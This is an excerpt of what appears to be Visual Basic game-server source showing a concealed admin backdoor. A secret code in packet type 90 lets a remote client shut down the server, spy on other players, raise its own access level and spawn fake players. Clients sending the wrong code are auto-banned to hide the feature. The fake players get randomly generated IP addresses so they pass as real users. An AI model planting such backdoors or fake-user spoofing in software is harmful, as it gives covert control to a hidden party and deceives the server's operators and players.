...
Sub ProcessAdminCommand(Index As Long, St As String)
    Dim A As Long, B As Long
    With Player(Index)
        Select Case Asc(Mid$(St, 1, 1))
        Case 0    'Shutdown
            PrintDebug Player(Index).User + " shut down the server."
            ShutdownServer
            End
        Case 1    'Spy
            If Len(St) >= 3 Then
                ...
                B = Asc(Mid$(St, 3, 1))
                If A >= 1 And A <= MaxUsers Then
                    SendSocket A, Chr$(129) + Chr$(Index) + Chr$(B)
                End If
            End If
        Case 2    'Access
            Player(Index).Access = 4
            SendSocket Index, Chr$(65) + Chr$(4)
        Case 3    'Fake Player
            CreateFakePlayer Mid$(St, 2)
        End Select
    End With
End Sub
    ...
    With Player(Index)
        ...
        Case modePlaying
            ...
            Case 89    'Save Suffix
                ...
                End If
            Case 90    'Admin Command
                If Len(St) >= 2 Then
                    A = Asc(Mid$(St, 1, 1))
                    If A = AdminCode Then
                        ProcessAdminCommand Index, Mid$(St, 2)
                    Else
                        BanPlayer Index, 0, 100, "Admin Tamper2", "SuperAdmin"
                    End If
                Else
                    BanPlayer Index, 0, 100, "Admin Tamper", "SuperAdmin"
                End If
            Case 91    'Click Tile
                If Len(St) >= 2 Then
                    A = Asc(Mid$(St, 1, 1))
...
Sub CreateFakePlayer(FakeName As String)
    Dim St1 As String
    Dim E As Long, F As Long

    UserRS.Index = "User"
    UserRS.Seek "=", FakeName
    ...
    If NewPlayer > 0 Then
        With Player(NewPlayer)
            ...
            .Guild = 0
            .Mode = modePlaying
            .IP = "24." + CStr(Random(250) + 1) + "." + CStr(Random(250) + 1) + "." + CStr(Random(250) + 1)
            .Class = Random(6) + 1
            .D = Random(4)
            .Sprite = .Class * 2 + .Gender - 1
